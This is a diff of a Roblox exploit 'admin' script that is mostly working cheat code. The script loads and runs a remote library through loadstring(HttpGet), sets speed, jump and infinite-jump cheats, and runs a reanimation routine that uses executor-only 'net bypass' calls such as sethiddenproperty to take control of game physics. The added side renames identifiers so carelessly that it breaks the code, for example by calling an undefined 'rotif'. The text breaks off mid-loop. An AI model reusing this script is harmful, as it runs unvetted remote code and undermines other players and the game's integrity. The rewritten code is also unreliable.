@@ -33,72 +33,72 @@ wear your super high tech glasses.
 YOU. HAVE. BEEN. WARNED.
 i do not own some of the code all credits to the original scripter
 ]]
-function rotif(L_3_arg0,L_4_arg1)game.StarterGui:SetCore("SendNotification", {
-                Title = L_3_arg0,
-                Text = L_4_arg1,
-                Duration = 5
-        })end;local L_1_= loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20Command%20UI%20Library/Source.lua', true))()local L_2_= L_1_:CreateWindow({
-        Name = 'Some Admin V.1',
-        IntroText = 'inf yield better(prefix: ;)',
-        IntroIcon = "https://cdn-icons-png.flaticon.com/512/2991/2991252.png",
-        IntroBlur = true,
-        IntroBlurIntensity = 15,
-        Theme = L_1_.Themes.dark,
-        Position = 'bottom',
-        Draggable = false,
-        Prefix = ';'
-})L_2_:AddCommand('SetPrefix', {
-        'New Prefix'
-}, 'Changes The Prefix.', function(L_5_arg0, L_6_arg1)
-        L_2_:ChangePrefix(L_5_arg0[1])
-end)L_2_:AddCommand('Notify', {
-        'String'
-}, 'Creates A Notification.', function(L_7_arg0, L_8_arg1)
-        L_2_:CreateNotification('Some Admin', L_7_arg0[1], 5)
-end)L_2_:AddCommand('Rejoin', {}, 'rejoin same server.', function(L_9_arg0, L_10_arg1)
-        local L_11_ = game:GetService("TeleportService")
-        local L_12_ = game.Players.LocalPlayer
-        L_11_:Teleport(game.PlaceId, L_12_)
-end)L_2_:AddCommand('Rotif', {
-        'Title{String}',
-        'Text{String}'
-}, 'Creates A RobloxNotification.', function(L_13_arg0, L_14_arg1)
-        rotif(L_13_arg0[1], L_13_arg0[2])
-end)L_2_:AddCommand('WalkSpeed', {
-        'Interger'
-}, 'change ur walk speed.', function(L_15_arg0, L_16_arg1)
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = L_15_arg0[1]
-end)L_2_:AddCommand('JumPower', {
-        'Interger'
-}, 'change ur Jump Power.', function(L_17_arg0, L_18_arg1)
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = L_17_arg0[1]
-end)L_2_:AddCommand('infjump', {}, 'infinite jump.', function(L_19_arg0, L_20_arg1)
-        spawn(function()
-                game:GetService("UserInputService").JumpRequest:connect(function()
-                        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-                end)
-        end)
-end)L_2_:AddCommand('Amongus', {}, 'Become Among the US.', function(L_21_arg0, L_22_arg1)
-        local L_23_ = 1000 --velocity
+function a(a,b)game.StarterGui:SetCore("SendNotification", {
+    Title = a,
+    Text = b,
+    Duration = 5
+})end;local a= loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20Command%20UI%20Library/Source.lua', true))()local a= a:CreateWindow({
+Name = 'Some Admin V.1',
+IntroText = 'inf yield better(prefix: ;)',
+IntroIcon = "https://cdn-icons-png.flaticon.com/512/2991/2991252.png",
+IntroBlur = true,
+IntroBlurIntensity = 15,
+Theme = a.Themes.dark,
+Position = 'bottom',
+Draggable = false,
+Prefix = ';'
+})a:AddCommand('SetPrefix', {
+'New Prefix'
+}, 'Changes The Prefix.', function(b, c)
+a:ChangePrefix(b[1])
+end)a:AddCommand('Notify', {
+'String'
+}, 'Creates A Notification.', function(b, c)
+a:CreateNotification('Some Admin', b[1], 5)
+end)a:AddCommand('Rejoin', {}, 'rejoin same server.', function(a, a)
+local a = game:GetService("TeleportService")
+local b = game.Players.LocalPlayer
+a:Teleport(game.PlaceId, b)
+end)a:AddCommand('Rotif', {
+'Title{String}',
+'Text{String}'
+}, 'Creates A RobloxNotification.', function(a, b)
+rotif(a[1], a[2])
+end)a:AddCommand('WalkSpeed', {
+'Interger'
+}, 'change ur walk speed.', function(a, b)
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = a[1]
+end)a:AddCommand('JumPower', {
+'Interger'
+}, 'change ur Jump Power.', function(a, b)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = a[1]
+end)a:AddCommand('infjump', {}, 'infinite jump.', function(a, a)
+spawn(function()
+    game:GetService("UserInputService").JumpRequest:connect(function()
+            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+    end)
+end)
+end)a:AddCommand('Amongus', {}, 'Become Among the US.', function(a, a)
+local a = 1000 --velocity
 --netboost usage:
 --set to false to disable
 --set to a vector3 value if you dont want the velocity to change
 --set to a number to change the velocity in real time with magnitude equal to the number
-        local L_24_ = 0.005 --used only in case netboost is set to a number value
+local c = 0.005 --used only in case netboost is set to a number value
 --if magnitude of the real velocity of a part is lower than this
 --then the fake velocity is being set to Vector3.new(0, netboost, 0)
 --the lower value the less you jitter but you might loose network ownership
-        local L_25_ = "shp" --simulation radius (net bypass) method
+local d = "shp" --simulation radius (net bypass) method
 --"shp" - sethiddenproperty
 --"ssr" - setsimulationradius
 --false - disable
-        local L_26_ = true --removes hingeConstraints and ballSocketConstraints from your character
-        local L_27_ = false --disables the animate script and enables after reanimation
-        local L_28_ = true --disables all localScripts parented to your character before reanimation
-        local L_29_ = true --tries to convert your character to r6 if its r15
-        local L_30_ = false --puts all tools from backpack to character and lets you hold them after reanimation
-        local L_31_ = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
-        local L_32_ = 3 --reanimation method
+local e = true --removes hingeConstraints and ballSocketConstraints from your character
+local f = false --disables the animate script and enables after reanimation
+local g = true --disables all localScripts parented to your character before reanimation
+local h = true --tries to convert your character to r6 if its r15
+local i = false --puts all tools from backpack to character and lets you hold them after reanimation
+local j = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
+local l = 3 --reanimation method
 --methods:
 --0 - breakJoints (takes [loadtime] seconds to laod)
 --1 - limbs
@@ -106,981 +106,981 @@ end)L_2_:AddCommand('Amongus', {}, 'Become Among the US.', function(L_21_arg0, L
 --3 - limbs + breakJoints after [loadtime] seconds
 --4 - remove humanoid + breakJoints
 --5 - remove humanoid + limbs
-        local L_33_ = 2 --AlignPosition mode
+local m = 2 --AlignPosition mode
 --modes:
 --1 - AlignPosition rigidity enabled true
 --2 - 2 AlignPositions rigidity enabled both true and false
 --3 - AlignPosition rigidity enabled false
-        local L_34_ = true --disable aligns for head and enable after neck is removed
-        local L_35_ = game:GetService("Players").LocalPlayer
-        local L_36_ = game:GetService("RunService")
-        local L_37_ = L_36_.Stepped
-        local L_38_ = L_36_.Heartbeat
-        local L_39_ = L_36_.RenderStepped
-        local L_40_ = game:GetService("StarterGui")
-        local L_41_ = game:GetService("Workspace")
-        local L_42_ = CFrame.new
-        local L_43_ = Vector3.new
-        local L_44_ = L_43_(0, 0, 0)
-        local L_45_ = math.huge
-        local L_46_ = L_35_.Character
-        if not (L_46_ and L_46_.Parent) then
-                return
-        end
-        for L_81_forvar0, L_82_forvar1 in pairs(L_46_:GetDescendants()) do
-                if L_82_forvar1:IsA("CharacterMesh") or L_82_forvar1:IsA("SpecialMesh") then
-                        L_82_forvar1:Destroy()
-                end
-        end
-        L_46_:GetPropertyChangedSignal("Parent"):Connect(function()
-                if not (L_46_ and L_46_.Parent) then
-                        L_46_ = nil
-                end
-        end)
-        local function L_47_func(L_83_arg0, L_84_arg1, L_85_arg2)
-                local L_86_ = nil
-                pcall(function()
-                        for L_87_forvar0, L_88_forvar1 in pairs(L_83_arg0:GetChildren()) do
-                                if (L_88_forvar1.Name == L_84_arg1) and L_88_forvar1:IsA(L_85_arg2) then
-                                        L_86_ = L_88_forvar1
-                                        break
-                                end
-                        end
-                end)
-                return L_86_
-        end
-        local function L_48_func(L_89_arg0, L_90_arg1)
-                L_89_arg0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
-                local L_91_ = Instance.new("Attachment", L_89_arg0)
-                L_91_.Orientation = L_44_
-                L_91_.Position = L_44_
-                L_91_.Name = "att0_" .. L_89_arg0.Name
-                local L_92_ = Instance.new("Attachment", L_90_arg1)
-                L_92_.Orientation = L_44_
-                L_92_.Position = L_44_
-                L_92_.Name = "att1_" .. L_90_arg1.Name
-                if (L_33_ == 1) or (L_33_ == 2) then
-                        local L_94_ = Instance.new("AlignPosition", L_91_)
-                        L_94_.ApplyAtCenterOfMass = false
-                        L_94_.MaxForce = L_45_
-                        L_94_.MaxVelocity = L_45_
-                        L_94_.ReactionForceEnabled = false
-                        L_94_.Responsiveness = 200
-                        L_94_.Attachment1 = L_92_
-                        L_94_.Attachment0 = L_91_
-                        L_94_.Name = "AlignPositionRtrue"
-                        L_94_.RigidityEnabled = true
-                end
-                if (L_33_ == 2) or (L_33_ == 3) then
-                        local L_95_ = Instance.new("AlignPosition", L_91_)
-                        L_95_.ApplyAtCenterOfMass = false
-                        L_95_.MaxForce = L_45_
-                        L_95_.MaxVelocity = L_45_
-                        L_95_.ReactionForceEnabled = false
-                        L_95_.Responsiveness = 200
-                        L_95_.Attachment1 = L_92_
-                        L_95_.Attachment0 = L_91_
-                        L_95_.Name = "AlignPositionRfalse"
-                        L_95_.RigidityEnabled = false
-                end
-                local L_93_ = Instance.new("AlignOrientation", L_91_)
-                L_93_.MaxAngularVelocity = L_45_
-                L_93_.MaxTorque = L_45_
-                L_93_.PrimaryAxisOnly = false
-                L_93_.ReactionTorqueEnabled = false
-                L_93_.Responsiveness = 200
-                L_93_.Attachment1 = L_92_
-                L_93_.Attachment0 = L_91_
-                L_93_.RigidityEnabled = false
-                if L_23_ then
-                        L_89_arg0:GetPropertyChangedSignal("Parent"):Connect(function()
-                                if not (L_89_arg0 and L_89_arg0.Parent) then
-                                        L_89_arg0 = nil
-                                end
-                        end)
-                        spawn(function()
-                                if typeof(L_23_) == "Vector3" then
-                                        local L_96_ = L_44_
-                                        local L_97_ = L_44_
-                                        while L_89_arg0 do
-                                                L_89_arg0.Velocity = L_96_
-                                                L_89_arg0.RotVelocity = L_97_
-                                                L_38_:Wait()
-                                                if L_89_arg0 then
-                                                        L_96_ = L_89_arg0.Velocity
-                                                        L_89_arg0.Velocity = L_23_
-                                                        L_89_arg0.RotVelocity = L_44_
-                                                        L_37_:Wait()
-                                                end
-                                        end
-                                elseif typeof(L_23_) == "number" then
-                                        local L_98_ = L_44_
-                                        local L_99_ = L_44_
-                                        while L_89_arg0 do
-                                                L_89_arg0.Velocity = L_98_
-                                                L_89_arg0.RotVelocity = L_99_
-                                                L_38_:Wait()
-                                                if L_89_arg0 then
-                                                        local L_100_ = L_98_
-                                                        local L_101_ = L_100_.Magnitude
-                                                        if L_101_ < L_24_ then
-                                                                L_100_ = L_43_(0, L_23_, 0)
-                                                        else
-                                                                local L_102_ = L_23_ / L_101_
-                                                                L_100_ *= L_43_(L_102_, L_102_, L_102_)
-                                                        end
-                                                        L_98_ = L_89_arg0.Velocity
-                                                        L_99_ = L_89_arg0.RotVelocity
-                                                        L_89_arg0.Velocity = L_100_
-                                                        L_89_arg0.RotVelocity = L_44_
-                                                        L_37_:Wait()
-                                                end
-                                        end
-                                end
-                        end)
-                end
-        end
-        local function L_49_func()
-                local L_103_ = L_35_.Character
-                local L_104_ = L_41_.CurrentCamera.CFrame
-                local L_105_ = Instance.new("Model")
-                local L_106_ = Instance.new("Humanoid", L_105_)
-                L_35_.Character = L_105_
-                L_106_.Health = 0
-                L_35_.Character = L_103_
-                L_105_:Destroy()
-                local L_107_ = nil
-                local function L_108_func()
-                        L_107_:Disconnect()
-                        L_41_.CurrentCamera.CFrame = L_104_
-                end
-                L_107_ = L_39_:Connect(L_108_func)
-        end
-        local L_50_ = (L_32_ == 4) or (L_32_ == 5)
-        local L_51_ = (L_32_ == 0) or (L_32_ == 4)
-        local L_52_ = (L_32_ == 0) or (L_32_ == 2) or (L_32_ == 3)
-        L_30_ = L_30_ and L_47_func(L_35_, "Backpack", "Backpack")
-        if L_25_ == "shp" then
-                local L_109_ = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
-                if L_109_ then
-                        spawn(function()
-                                while L_46_ and L_38_:Wait() do
-                                        L_109_(L_35_, "SimulationRadius", L_45_)
-                                end
-                        end)
-                end
-        elseif L_25_ == "ssr" then
-                local L_110_ = setsimulationradius or set_simulation_radius or set_sim_radius or setsimradius or set_simulation_rad or setsimulationrad
-                if L_110_ then
-                        spawn(function()
-                                while L_46_ and L_38_:Wait() do
-                                        L_110_(L_45_)
-                                end
-                        end)
-                end
-        end
-        L_26_ = L_26_ and function(L_111_arg0)
-                if L_111_arg0:IsA("HingeConstraint") or L_111_arg0:IsA("BallSocketConstraint") then
-                        L_111_arg0.Parent = nil
-                end
-        end
-        if L_26_ then
-                for L_112_forvar0, L_113_forvar1 in pairs(L_46_:GetDescendants()) do
-                        L_26_(L_113_forvar1)
-                end
-                L_46_.DescendantAdded:Connect(L_26_)
-        end
-        if L_52_ then
-                L_49_func()
-        end
-        if L_32_ == 0 then
-                wait(L_31_)
-                if not L_46_ then
-                        return
-                end
-        end
-        if L_28_ then
-                for L_114_forvar0, L_115_forvar1 in pairs(L_46_:GetChildren()) do
-                        if L_115_forvar1:IsA("LocalScript") then
-                                L_115_forvar1.Disabled = true
-                        end
-                end
-        elseif L_27_ then
-                local L_116_ = L_47_func(L_46_, "Animate", "LocalScript")
-                if L_116_ and (not L_116_.Disabled) then
-                        L_116_.Disabled = true
-                else
-                        L_27_ = false
-                end
-        end
-        local L_53_ = L_46_:FindFirstChildOfClass("Humanoid")
-        if L_53_ then
-                for L_117_forvar0, L_118_forvar1 in pairs(L_53_:GetPlayingAnimationTracks()) do
-                        L_118_forvar1:Stop()
-                end
-        end
-        if L_30_ then
-                for L_119_forvar0, L_120_forvar1 in pairs(L_30_:GetChildren()) do
-                        if L_120_forvar1:IsA("Tool") then
-                                L_120_forvar1.Parent = L_46_
-                        end
-                end
-        end
-        pcall(function()
-                settings().Physics.AllowSleep = false
-                settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
-        end)
-        local L_54_ = {}
-        for L_121_forvar0, L_122_forvar1 in pairs(L_46_:GetDescendants()) do
-                if L_122_forvar1.ClassName == "Script" then
-                        table.insert(L_54_, L_122_forvar1)
-                end
-        end
-        local L_55_ = {}
-        for L_123_forvar0, L_124_forvar1 in pairs(L_46_:GetDescendants()) do
-                if L_124_forvar1:IsA("BasePart") then
-                        local L_125_ = tostring(L_123_forvar0)
-                        local L_126_ = true
-                        while L_126_ do
-                                L_126_ = false
-                                for L_127_forvar0, L_128_forvar1 in pairs(L_54_) do
-                                        if L_128_forvar1.Name == L_125_ then
-                                                L_126_ = true
-                                        end
-                                end
-                                if L_126_ then
-                                        L_125_ = L_125_ .. "_"
-                                end
-                        end
-                        table.insert(L_55_, L_125_)
-                        Instance.new("Script", L_124_forvar1).Name = L_125_
-                end
-        end
-        L_46_.Archivable = true
-        local L_56_ = L_46_:Clone()
-        for L_129_forvar0, L_130_forvar1 in pairs(L_56_:GetDescendants()) do
-                pcall(function()
-                        L_130_forvar1.Transparency = 1
-                        L_130_forvar1.Anchored = false
-                end)
-        end
-        local L_57_ = Instance.new("Model", L_46_)
-        L_57_.Name = L_57_.ClassName
-        L_57_:GetPropertyChangedSignal("Parent"):Connect(function()
-                if not (L_57_ and L_57_.Parent) then
-                        L_57_ = nil
-                end
-        end)
-        for L_131_forvar0, L_132_forvar1 in pairs(L_46_:GetChildren()) do
-                if L_132_forvar1 ~= L_57_ then
-                        if L_50_ and L_132_forvar1:IsA("Humanoid") then
-                                L_132_forvar1:Destroy()
-                        else
-                                if L_30_ and L_132_forvar1:IsA("Tool") then
-                                        for L_133_forvar0, L_134_forvar1 in pairs(L_132_forvar1:GetDescendants()) do
-                                                if L_134_forvar1 and L_134_forvar1.Parent and L_134_forvar1:IsA("BasePart") then
-                                                        local L_135_ = Instance.new("BodyVelocity", L_134_forvar1)
-                                                        L_135_.Velocity = L_44_
-                                                        L_135_.MaxForce = L_43_(1000, 1000, 1000)
-                                                        L_135_.P = 1250
-                                                        L_135_.Name = "bv_" .. L_132_forvar1.Name
-                                                end
-                                        end
-                                end
-                                L_132_forvar1.Parent = L_57_
-                        end
-                end
-        end
-        local L_58_ = L_47_func(L_57_, "Head", "BasePart")
-        local L_59_ = L_47_func(L_57_, "Torso", "BasePart") or L_47_func(L_57_, "UpperTorso", "BasePart")
-        if L_51_ then
-                L_57_:BreakJoints()
-        else
-                if L_58_ and L_59_ then
-                        for L_136_forvar0, L_137_forvar1 in pairs(L_57_:GetDescendants()) do
-                                if L_137_forvar1:IsA("Weld") or L_137_forvar1:IsA("Snap") or L_137_forvar1:IsA("Glue") or L_137_forvar1:IsA("Motor") or L_137_forvar1:IsA("Motor6D") then
-                                        local L_138_ = false
-                                        if (L_137_forvar1.Part0 == L_59_) and (L_137_forvar1.Part1 == L_58_) then
-                                                L_138_ = true
-                                        end
-                                        if (L_137_forvar1.Part0 == L_58_) and (L_137_forvar1.Part1 == L_59_) then
-                                                L_138_ = true
-                                        end
-                                        if L_138_ then
-                                                if L_34_ then
-                                                        L_34_ = L_137_forvar1
-                                                end
-                                        else
-                                                L_137_forvar1:Destroy()
-                                        end
-                                end
-                        end
-                end
-                if L_32_ == 3 then
-                        spawn(function()
-                                wait(L_31_)
-                                if L_57_ then
-                                        L_57_:BreakJoints()
-                                end
-                        end)
-                end
-        end
-        L_56_.Parent = L_46_
-        for L_139_forvar0, L_140_forvar1 in pairs(L_56_:GetChildren()) do
-                L_140_forvar1.Parent = L_46_
-        end
-        L_56_:Destroy()
-        local L_60_ = {}
-        for L_141_forvar0, L_142_forvar1 in pairs(L_57_:GetDescendants()) do
-                if L_142_forvar1:IsA("BasePart") then
-                        L_141_forvar0 = tostring(L_141_forvar0)
-                        local L_143_ = nil
-                        L_143_ = L_142_forvar1:GetPropertyChangedSignal("Parent"):Connect(function()
-                                if not (L_142_forvar1 and L_142_forvar1.Parent) then
-                                        L_143_:Disconnect()
-                                        L_60_[L_141_forvar0] = nil
-                                end
-                        end)
-                        L_60_[L_141_forvar0] = L_142_forvar1
-                end
-        end
-        local L_61_ = nil
-        local function L_62_func()
-                if L_57_ then
-                        for L_144_forvar0, L_145_forvar1 in pairs(L_60_) do
-                                L_145_forvar1.CanCollide = false
-                        end
-                else
-                        L_61_:Disconnect()
-                end
-        end
-        L_61_ = L_37_:Connect(L_62_func)
-        L_62_func()
-        for L_146_forvar0, L_147_forvar1 in pairs(L_57_:GetDescendants()) do
-                if (L_147_forvar1.ClassName == "Script") and table.find(L_55_, L_147_forvar1.Name) then
-                        local L_148_ = L_147_forvar1.Parent
-                        if L_148_:IsA("BasePart") then
-                                for L_149_forvar0, L_150_forvar1 in pairs(L_46_:GetDescendants()) do
-                                        if (L_150_forvar1.ClassName == "Script") and (L_150_forvar1.Name == L_147_forvar1.Name) and (not L_150_forvar1:IsDescendantOf(L_57_)) then
-                                                local L_151_ = L_150_forvar1.Parent
-                                                if (L_151_.ClassName == L_148_.ClassName) and (L_151_.Name == L_148_.Name) then
-                                                        L_48_func(L_148_, L_151_)
-                                                        break
-                                                end
-                                        end
-                                end
-                        end
-                end
-        end
-        if (typeof(L_34_) == "Instance") and L_58_ and L_58_.Parent then
-                local L_152_ = {}
-                for L_153_forvar0, L_154_forvar1 in pairs(L_58_:GetDescendants()) do
-                        if L_154_forvar1:IsA("AlignPosition") or L_154_forvar1:IsA("AlignOrientation") then
-                                table.insert(L_152_, L_154_forvar1)
-                                L_154_forvar1.Enabled = false
-                        end
-                end
-                spawn(function()
-                        while L_46_ and L_34_ and L_34_.Parent do
-                                L_37_:Wait()
-                        end
-                        if not (L_46_ and L_58_ and L_58_.Parent) then
-                                return
-                        end
-                        for L_155_forvar0, L_156_forvar1 in pairs(L_152_) do
-                                pcall(function()
-                                        L_156_forvar1.Enabled = true
-                                end)
-                        end
-                end)
-        end
-        for L_157_forvar0, L_158_forvar1 in pairs(L_46_:GetDescendants()) do
-                if L_158_forvar1 and L_158_forvar1.Parent then
-                        if L_158_forvar1.ClassName == "Script" then
-                                if table.find(L_55_, L_158_forvar1.Name) then
-                                        L_158_forvar1:Destroy()
-                                end
-                        elseif not L_158_forvar1:IsDescendantOf(L_57_) then
-                                if L_158_forvar1:IsA("Decal") then
-                                        L_158_forvar1.Transparency = 1
-                                elseif L_158_forvar1:IsA("ForceField") then
-                                        L_158_forvar1.Visible = false
-                                elseif L_158_forvar1:IsA("Sound") then
-                                        L_158_forvar1.Playing = false
-                                elseif L_158_forvar1:IsA("BillboardGui") or L_158_forvar1:IsA("SurfaceGui") or L_158_forvar1:IsA("ParticleEmitter") or L_158_forvar1:IsA("Fire") or L_158_forvar1:IsA("Smoke") or L_158_forvar1:IsA("Sparkles") then
-                                        L_158_forvar1.Enabled = false
-                                end
-                        end
-                end
-        end
-        if L_27_ then
-                local L_159_ = L_47_func(L_46_, "Animate", "LocalScript")
-                if L_159_ then
-                        L_159_.Disabled = false
-                end
-        end
-        if L_30_ then
-                for L_160_forvar0, L_161_forvar1 in pairs(L_46_:GetChildren()) do
-                        if L_161_forvar1:IsA("Tool") then
-                                L_161_forvar1.Parent = L_30_
-                        end
-                end
-        end
-        local L_63_ = L_57_:FindFirstChildOfClass("Humanoid")
-        local L_64_ = L_46_:FindFirstChildOfClass("Humanoid")
-        if L_64_ then
-                L_41_.CurrentCamera.CameraSubject = L_64_
-                local L_162_ = nil
-                local function L_163_func()
-                        L_162_:Disconnect()
-                        if L_46_ and L_64_ and (L_64_.Parent == L_46_) then
-                                L_41_.CurrentCamera.CameraSubject = L_64_
-                        end
-                end
-                L_162_ = L_39_:Connect(L_163_func)
-                if L_63_ then
-                        L_63_.Changed:Connect(function(L_164_arg0)
-                                if (L_164_arg0 == "Jump") and L_64_ and L_64_.Parent then
-                                        L_64_.Jump = L_63_.Jump
-                                end
-                        end)
-                else
-                        L_35_.Character = nil
-                        L_35_.Character = L_46_
-                end
-        end
-        local L_65_ = Instance.new("BindableEvent", L_46_)
-        L_65_.Event:Connect(function()
-                L_65_:Destroy()
-                L_40_:SetCore("ResetButtonCallback", true)
-                if L_50_ then
-                        L_46_:BreakJoints()
-                        return
-                end
-                if L_52_ then
-                        if L_63_ and L_63_.Parent and (L_63_.Health > 0) then
-                                L_57_:BreakJoints()
-                                L_63_.Health = 0
-                        end
-                        L_49_func()
-                else
-                        if L_63_ and L_63_.Parent and (L_63_.Health > 0) then
-                                L_57_:BreakJoints()
-                                L_63_.Health = 0
-                        end
-                end
-        end)
-        L_40_:SetCore("ResetButtonCallback", L_65_)
-        spawn(function()
-                while L_46_ do
-                        if L_63_ and L_63_.Parent and L_64_ and L_64_.Parent then
-                                L_64_.Jump = L_63_.Jump
-                        end
-                        wait()
-                end
-                L_40_:SetCore("ResetButtonCallback", true)
-        end)
-        L_29_ = L_29_ and L_64_ and (L_64_.RigType == Enum.HumanoidRigType.R15)
-        if L_29_ then
-                local L_165_ = nil
-                pcall(function()
-                        L_165_ = L_47_func(L_46_, "HumanoidRootPart", "BasePart").CFrame
-                end)
-                if L_165_ then
-                        local L_166_ = {
-                                head = {
-                                        Name = "Head",
-                                        Size = L_43_(2, 1, 1),
-                                        R15 = {
-                                                Head = 0
-                                        }
-                                },
-                                torso = {
-                                        Name = "Torso",
-                                        Size = L_43_(2, 2, 1),
-                                        R15 = {
-                                                UpperTorso = 0.2,
-                                                LowerTorso = - 0.8
-                                        }
-                                },
-                                root = {
-                                        Name = "HumanoidRootPart",
-                                        Size = L_43_(2, 2, 1),
-                                        R15 = {
-                                                HumanoidRootPart = 0
-                                        }
-                                },
-                                leftArm = {
-                                        Name = "Left Arm",
-                                        Size = L_43_(1, 2, 1),
-                                        R15 = {
-                                                LeftHand = - 0.85,
-                                                LeftLowerArm = - 0.2,
-                                                LeftUpperArm = 0.4
-                                        }
-                                },
-                                rightArm = {
-                                        Name = "Right Arm",
-                                        Size = L_43_(1, 2, 1),
-                                        R15 = {
-                                                RightHand = - 0.85,
-                                                RightLowerArm = - 0.2,
-                                                RightUpperArm = 0.4
-                                        }
-                                },
-                                leftLeg = {
-                                        Name = "Left Leg",
-                                        Size = L_43_(1, 2, 1),
-                                        R15 = {
-                                                LeftFoot = - 0.85,
-                                                LeftLowerLeg = - 0.15,
-                                                LeftUpperLeg = 0.6
-                                        }
-                                },
-                                rightLeg = {
-                                        Name = "Right Leg",
-                                        Size = L_43_(1, 2, 1),
-                                        R15 = {
-                                                RightFoot = - 0.85,
-                                                RightLowerLeg = - 0.15,
-                                                RightUpperLeg = 0.6
-                                        }
-                                }
-                        }
-                        for L_168_forvar0, L_169_forvar1 in pairs(L_46_:GetChildren()) do
-                                if L_169_forvar1:IsA("BasePart") then
-                                        for L_170_forvar0, L_171_forvar1 in pairs(L_169_forvar1:GetChildren()) do
-                                                if L_171_forvar1:IsA("Motor6D") then
-                                                        L_171_forvar1.Part0 = nil
-                                                end
-                                        end
-                                end
-                        end
-                        for L_172_forvar0, L_173_forvar1 in pairs(L_166_) do
-                                local L_174_ = Instance.new("Part")
-                                L_174_.Name = L_173_forvar1.Name
-                                L_174_.Size = L_173_forvar1.Size
-                                L_174_.CFrame = L_165_
-                                L_174_.Anchored = false
-                                L_174_.Transparency = 1
-                                L_174_.CanCollide = false
-                                for L_175_forvar0, L_176_forvar1 in pairs(L_173_forvar1.R15) do
-                                        local L_177_ = L_47_func(L_46_, L_175_forvar0, "BasePart")
-                                        local L_178_ = L_47_func(L_177_, "att1_" .. L_175_forvar0, "Attachment")
-                                        if L_177_ then
-                                                local L_179_ = Instance.new("Weld", L_177_)
-                                                L_179_.Name = "Weld_" .. L_175_forvar0
-                                                L_179_.Part0 = L_174_
-                                                L_179_.Part1 = L_177_
-                                                L_179_.C0 = L_42_(0, L_176_forvar1, 0)
-                                                L_179_.C1 = L_42_(0, 0, 0)
-                                                L_177_.Massless = true
-                                                L_177_.Name = "R15_" .. L_175_forvar0
-                                                L_177_.Parent = L_174_
-                                                if L_178_ then
-                                                        L_178_.Parent = L_174_
-                                                        L_178_.Position = L_43_(0, L_176_forvar1, 0)
-                                                end
-                                        end
-                                end
-                                L_174_.Parent = L_46_
-                                L_166_[L_172_forvar0] = L_174_
-                        end
-                        local L_167_ = {
-                                neck = {
-                                        Parent = L_166_.torso,
-                                        Name = "Neck",
-                                        Part0 = L_166_.torso,
-                                        Part1 = L_166_.head,
-                                        C0 = L_42_(0, 1, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0),
-                                        C1 = L_42_(0, - 0.5, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0)
-                                },
-                                rootJoint = {
-                                        Parent = L_166_.root,
-                                        Name = "RootJoint",
-                                        Part0 = L_166_.root,
-                                        Part1 = L_166_.torso,
-                                        C0 = L_42_(0, 0, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0),
-                                        C1 = L_42_(0, 0, 0,-1, 0, 0, 0, 0, 1, 0, 1, 0)
-                                },
-                                rightShoulder = {
-                                        Parent = L_166_.torso,
-                                        Name = "Right Shoulder",
-                                        Part0 = L_166_.torso,
-                                        Part1 = L_166_.rightArm,
-                                        C0 = L_42_(1, 0.5, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0),
-                                        C1 = L_42_(- 0.5, 0.5, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0)
-                                },
-                                leftShoulder = {
-                                        Parent = L_166_.torso,
-                                        Name = "Left Shoulder",
-                                        Part0 = L_166_.torso,
-                                        Part1 = L_166_.leftArm,
-                                        C0 = L_42_(-1, 0.5, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0),
-                                        C1 = L_42_(0.5, 0.5, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0)
-                                },
-                                rightHip = {
-                                        Parent = L_166_.torso,
-                                        Name = "Right Hip",
-                                        Part0 = L_166_.torso,
-                                        Part1 = L_166_.rightLeg,
-                                        C0 = L_42_(1,-1, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0),
-                                        C1 = L_42_(0.5, 1, 0, 0, 0, 1, 0, 1, 0,-1, 0, 0)
-                                },
-                                leftHip = {
-                                        Parent = L_166_.torso,
-                                        Name = "Left Hip",
-                                        Part0 = L_166_.torso,
-                                        Part1 = L_166_.leftLeg,
-                                        C0 = L_42_(-1,-1, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0),
-                                        C1 = L_42_(- 0.5, 1, 0, 0, 0,-1, 0, 1, 0, 1, 0, 0)
-                                }
-                        }
-                        for L_180_forvar0, L_181_forvar1 in pairs(L_167_) do
-                                local L_182_ = Instance.new("Motor6D")
-                                for L_183_forvar0, L_184_forvar1 in pairs(L_181_forvar1) do
-                                        L_182_[L_183_forvar0] = L_184_forvar1
-                                end
-                                L_167_[L_180_forvar0] = L_182_
-                        end
-                        L_64_.RigType = Enum.HumanoidRigType.R6
-                        L_64_.HipHeight = 0
-                end
-        end
-        wait()
-        if not L_46_ then
-                return
-        end
-        local L_66_ = false
-        local L_67_ = false
-        local L_68_ = false
-        local L_69_ = false
-        local L_70_ = false
-        local L_71_ = false
-        local L_72_ = false
-        local L_73_ = false
-        local L_74_ = false
-        local L_75_ = 0
-        local L_76_ = L_35_:GetMouse()
-        local L_77_ = {
-                ["RootJoint"] = "",
-                ["Neck"] = "",
-                ["Right Hip"] = "",
-                ["Left Hip"] = "",
-                ["Left Shoulder"] = "",
-                ["Right Shoulder"] = ""
-        }
-        for L_185_forvar0, L_186_forvar1 in pairs(L_46_:GetDescendants()) do
-                if L_186_forvar1:IsA("Motor6D") and (L_77_[L_186_forvar1.Name] == "") and (not L_186_forvar1:IsDescendantOf(L_57_)) then
-                        L_77_[L_186_forvar1.Name] = L_186_forvar1
-                end
-        end
-        for L_187_forvar0, L_188_forvar1 in pairs(L_77_) do
